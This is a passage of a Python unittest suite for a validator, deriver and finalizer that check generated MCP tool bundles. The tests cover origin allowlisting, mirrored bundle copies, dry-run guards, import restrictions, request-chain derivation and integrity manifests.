                    encoding="utf-8",
                )
                diagnostics = validator_module.Diagnostics()
                validator_module.validate_runtime(
                    candidate,
                    vnext_capabilities(candidate),
                    "CODE2SKILL_DRY_RUN",
                    diagnostics,
                    vnext=True,
                )
                self.assertTrue(
                    any(expected in item for item in diagnostics.errors),
                    diagnostics.errors,
                )

    def test_bundle_copies_must_match(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            mirrored = json.loads((candidate / "function-core/capability-bundle.json").read_text())
            mirrored["recordingId"] = "changed-analysis"
            write_json(candidate / "function-core/capability-bundle.json", mirrored)
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("must exactly mirror", result.stderr)

    def test_disallowed_http_origin_fails(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            capability = bundle["capabilities"][0]
            capability["implementation"] = {
                "kind": "http",
                "steps": [{
                    "stepId": "search",
                    "method": "GET",
                    "authentication": "none",
                    "url": "https://unapproved.example/items",
                    "headers": {},
                    "bindings": [],
                    "successStatusCodes": [200],
                    "evidenceRefs": ["src/knowledge.mjs#topics"],
                }],
                "outputStepId": "search",
            }
            capability["successRule"]["kind"] = "http_status_and_output"
            for path in (candidate / "capability-bundle.json", candidate / "function-core/capability-bundle.json"):
                write_json(path, bundle)
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("origin is not allowlisted", result.stderr)

    def test_legacy_write_bundle_requires_workflow(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory), write_side_effect=True)
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("workflow.json", result.stderr)

    def test_documentation_must_cover_every_tool(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            skill = candidate / "SKILL.md"
            skill.write_text(skill.read_text().replace("`list_knowledge_topics`", "`different_tool`"), encoding="utf-8")
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("missing Tool guidance", result.stderr)

    def test_hand_written_json_rpc_runtime_fails(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            (candidate / "mcp-tool/index.mjs").write_text(
                "const dryRun = process.env.CODE2SKILL_DRY_RUN; const structuredContent = {}; const isError = true; process.stdin.resume();\n",
                encoding="utf-8",
            )
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("must import McpServer", result.stderr)

    def test_dynamic_tool_registration_fails(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            (candidate / "mcp-tool/index.mjs").write_text(
                "import { McpServer, StdioServerTransport, z } from './runtime.mjs'; "
                "const server = new McpServer({name: 'knowledge-capabilities', version: '1'}); "
                "const dryRun = process.env.CODE2SKILL_DRY_RUN; const structuredContent = {}; const isError = true; "
                "for (const tool of [{name: 'list_knowledge_topics'}]) server.registerTool(tool.name, {title: '知识主题：列出可用主题', description: '面向需要查看知识主题的用户，用于在调用检索能力前读取可靠目录；本工具无入参，返回主题代码与中文标签，可用于直接回答并停止，也可作为可靠输入交给下游继续检索；它在本地执行，不产生任何 HTTP 请求，属于只读能力且没有写入副作用，失败时应停止。', inputSchema: {}, outputSchema: {}}, async () => ({structuredContent, isError})); "
                "await server.connect(new StdioServerTransport());\n",
                encoding="utf-8",
            )
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("literal registerTool", result.stderr)

    def test_http_function_must_not_use_broad_response_ok(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            bundle["capabilities"][0]["implementation"] = {
                "kind": "http",
                "steps": [{
                    "stepId": "listKnowledgeTopics",
                    "method": "GET",
                    "authentication": "none",
                    "url": "https://application.example/api/topics",
                    "headers": {"accept": "application/json"},
                    "bindings": [],
                    "successStatusCodes": [200],
                    "evidenceRefs": ["src/knowledge.mjs#request"],
                }],
                "outputStepId": "listKnowledgeTopics",
            }
            bundle["capabilities"][0]["successRule"]["kind"] = "http_status_and_output"
            for path in (candidate / "capability-bundle.json", candidate / "function-core/capability-bundle.json"):
                write_json(path, bundle)
            (candidate / "function-core/index.mjs").write_text(
                "export async function listKnowledgeTopics(input, context = {}) { "
                "const response = await context.fetch('https://application.example/api/topics'); "
                "if (!response.ok) throw new Error(String(response.status)); return {status: response.status, data: {topics: []}}; }\n",
                encoding="utf-8",
            )
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("response.ok is too broad", result.stderr)

    def test_dry_run_requires_literal_one_guard(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            runtime = candidate / "mcp-tool/index.mjs"
            runtime.write_text(
                runtime.read_text().replace(
                    "process.env.CODE2SKILL_DRY_RUN === '1'",
                    "process.env.CODE2SKILL_DRY_RUN",
                ),
                encoding="utf-8",
            )
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("literal === \"1\" guard", result.stderr)

    def test_function_core_third_party_import_fails(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            (candidate / "function-core/index.mjs").write_text(
                "import { z } from 'zod'; export async function listKnowledgeTopics(input) { return {status: 200, data: {topics: []}}; }\n",
                encoding="utf-8",
            )
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("unsupported import `zod`", result.stderr)

    def test_vnext_deterministic_function_may_import_only_the_generated_guard(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            function_path = candidate / "function-core/index.mjs"
            function_path.write_text(
                "import { PortableWorkflowGuard } from '../portable-workflow-guard.mjs';\n"
                + function_path.read_text(encoding="utf-8"),
                encoding="utf-8",
            )
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            capability = bundle["capabilities"][0]
            capability["runtimeProtection"] = {
                "mode": "deterministic-workflow",
                "workflowId": "synthetic-workflow",
            }
            diagnostics = validator_module.Diagnostics()

            validator_module.validate_runtime(
                candidate,
                {capability["capabilityId"]: capability},
                "CODE2SKILL_DRY_RUN",
                diagnostics,
                vnext=True,
                allowed_runtime_origins={"https://application.example"},
            )

        self.assertFalse(
            any(
                "unsupported import `../portable-workflow-guard.mjs`" in item
                for item in diagnostics.errors
            ),
            diagnostics.errors,
        )

    def test_success_paths_must_be_relative_to_function_data(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            bundle["capabilities"][0]["successRule"]["requiredOutputPaths"] = [["data", "topics"]]
            for path in (candidate / "capability-bundle.json", candidate / "function-core/capability-bundle.json"):
                write_json(path, bundle)
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("relative to Function result.data", result.stderr)

    def test_business_status_output_path_is_allowed(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            bundle["capabilities"][0]["successRule"]["requiredOutputPaths"] = [["topics"], ["status"]]
            for path in (candidate / "capability-bundle.json", candidate / "function-core/capability-bundle.json"):
                write_json(path, bundle)
            result = self.run_validator(candidate)
            self.assertEqual(result.returncode, 0, result.stderr)

    def test_draft_requires_machine_readable_request_chain(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            draft = json.loads((candidate / "capability-draft.json").read_text())
            draft["requestChain"] = [{"step": "search", "request": "GET /api/items", "evidenceRefs": ["src/knowledge.mjs#topics"]}]
            write_json(candidate / "capability-draft.json", draft)
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("requestChain[0].stepId", result.stderr)

    def test_draft_inputs_must_use_qualified_tool_ownership(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            bundle["capabilities"][0]["inputs"] = [{
                "name": "topicCode",
                "type": "string",
                "required": True,
                "description": "Selected topic code.",
                "evidenceRefs": ["src/knowledge.mjs#topics"],
            }]
            for path in (candidate / "capability-bundle.json", candidate / "function-core/capability-bundle.json"):
                write_json(path, bundle)
            draft = json.loads((candidate / "capability-draft.json").read_text())
            draft["inputs"] = [{
                "name": "topicCode",
                "valueType": "string",
                "required": True,
                "description": "Selected topic code.",
                "evidenceRefs": ["src/knowledge.mjs#topics"],
            }]
            draft["provenance"] = [{
                "field": "topicCode",
                "source": "provided",
                "sourceDetail": "Provided by the caller.",
                "evidenceRefs": ["src/knowledge.mjs#topics"],
            }]
            write_json(candidate / "capability-draft.json", draft)
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("tools.<tool>.input.<name>", result.stderr)

    def test_draft_request_chain_must_match_bundle_steps(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            bundle["capabilities"][0]["implementation"] = {
                "kind": "http",
                "steps": [{
                    "stepId": "listKnowledgeTopics",
                    "method": "GET",
                    "authentication": "none",
                    "url": "https://application.example/api/topics",
                    "headers": {"accept": "application/json"},
                    "bindings": [],
                    "successStatusCodes": [200],
                    "evidenceRefs": ["src/knowledge.mjs#topics"],
                }],
                "outputStepId": "listKnowledgeTopics",
            }
            bundle["capabilities"][0]["successRule"]["kind"] = "http_status_and_output"
            for path in (candidate / "capability-bundle.json", candidate / "function-core/capability-bundle.json"):
                write_json(path, bundle)
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("mechanically derived", result.stderr)

    def test_deriver_mirrors_bundle_and_builds_qualified_draft(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            bundle = json.loads((candidate / "capability-bundle.json").read_text())
            bundle["capabilities"][0]["inputs"] = [{
                "name": "query",
                "description": "检索对象",
                "type": "object",
                "required": True,
                "evidenceRefs": ["src/knowledge.mjs#query"],
            }]
            bundle["capabilities"][0]["implementation"] = {
                "kind": "http",
                "steps": [{
                    "stepId": "listKnowledgeTopics",
                    "method": "GET",
                    "authentication": "none",
                    "url": "https://application.example/api/topics",
                    "headers": {"accept": "application/json"},
                    "bindings": [{
                        "source": {"kind": "input", "inputName": "query"},
                        "location": "query",
                        "path": ["filters"],
                        "evidenceRefs": ["src/knowledge.mjs#query"],
                    }],
                    "successStatusCodes": [200],
                    "evidenceRefs": ["src/knowledge.mjs#request"],
                }],
                "outputStepId": "listKnowledgeTopics",
            }
            bundle["capabilities"][0]["successRule"]["kind"] = "http_status_and_output"
            write_json(candidate / "capability-bundle.json", bundle)
            result = subprocess.run(
                [sys.executable, str(DERIVER), str(candidate)],
                check=False,
                capture_output=True,
                text=True,
            )
            self.assertEqual(result.returncode, 0, result.stderr)
            self.assertEqual(
                json.loads((candidate / "function-core/capability-bundle.json").read_text()),
                bundle,
            )
            draft = json.loads((candidate / "capability-draft.json").read_text())
            self.assertEqual(draft["schemaVersion"], "v1")
            self.assertEqual(draft["recordingId"], bundle["recordingId"])
            self.assertEqual(draft["inputs"][0]["name"], "tools.list_knowledge_topics.input.query")
            self.assertEqual(draft["provenance"][0]["source"], "provided")
            self.assertEqual(draft["requestChain"][0]["stepId"], "list_knowledge_topics.listKnowledgeTopics")
            self.assertEqual(draft["requestChain"][0]["inputMappings"][0]["targetPath"], "filters")

    def test_mcp_runtime_must_not_leave_third_party_imports(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            candidate = create_base(Path(directory))
            (candidate / "mcp-tool/runtime.mjs").write_text(
                "import { z } from 'zod'; class McpServer {} class StdioServerTransport {} export { McpServer, StdioServerTransport, z };\n",
                encoding="utf-8",
            )
            result = self.run_validator(candidate)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("unresolved third-party import `zod`", result.stderr)

    def test_finalizer_requires_real_success_result(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = create_base(root)
            report = root / "report.json"
            live_input = root / "input.json"
            live_result = root / "result.json"
            write_json(report, {"status": "passed", "checks": [{"name": "unit", "status": "passed", "command": "node test.mjs"}]})
            write_json(live_input, {"name": "list_knowledge_topics", "arguments": {}})
            write_json(live_result, {"isError": True})
            result = subprocess.run([
                sys.executable, str(FINALIZER), str(candidate),
                "--verification-report", str(report),
                "--live-input", str(live_input),
                "--live-result", str(live_result),
            ], check=False, capture_output=True, text=True)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("real successful MCP result", result.stderr)

    def test_finalizer_writes_valid_integrity_chain(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = create_base(root)
            report = root / "report.json"
            live_input = root / "input.json"
            live_result = root / "result.json"
            write_json(report, {"status": "passed", "checks": [{"name": "unit", "status": "passed", "command": "node test.mjs"}]})
            write_json(live_input, {"name": "list_knowledge_topics", "arguments": {}})
            write_json(live_result, {"isError": False, "structuredContent": {"status": "success", "data": {"topics": []}}})
            result = subprocess.run([
                sys.executable, str(FINALIZER), str(candidate),
                "--verification-report", str(report),
                "--live-input", str(live_input),
                "--live-result", str(live_result),
            ], check=False, capture_output=True, text=True)
            self.assertEqual(result.returncode, 0, result.stderr)
            final = self.run_validator(candidate, pre_finalize=False)
            self.assertEqual(final.returncode, 0, final.stderr)

    def test_manifest_detects_post_approval_mutation(self) -> None:
        with tempfile.TemporaryDirectory() as directory:
            root = Path(directory)
            candidate = create_base(root)
            report = root / "report.json"
            live_input = root / "input.json"
            live_result = root / "result.json"
            write_json(report, {"status": "passed", "checks": [{"name": "unit", "status": "passed", "command": "node test.mjs"}]})
            write_json(live_input, {})
            write_json(live_result, {"isError": False})
            completed = subprocess.run([
                sys.executable, str(FINALIZER), str(candidate),
                "--verification-report", str(report),
                "--live-input", str(live_input),
                "--live-result", str(live_result),
            ], check=False, capture_output=True, text=True)
            self.assertEqual(completed.returncode, 0, completed.stderr)
            (candidate / "PAGE.md").write_text((candidate / "PAGE.md").read_text() + "\n发生变更。\n", encoding="utf-8")
            result = self.run_validator(candidate, pre_finalize=False)
            self.assertNotEqual(result.returncode, 0)
            self.assertIn("current sanitized file", result.stderr)


if __name__ == "__main__":
    unittest.main()
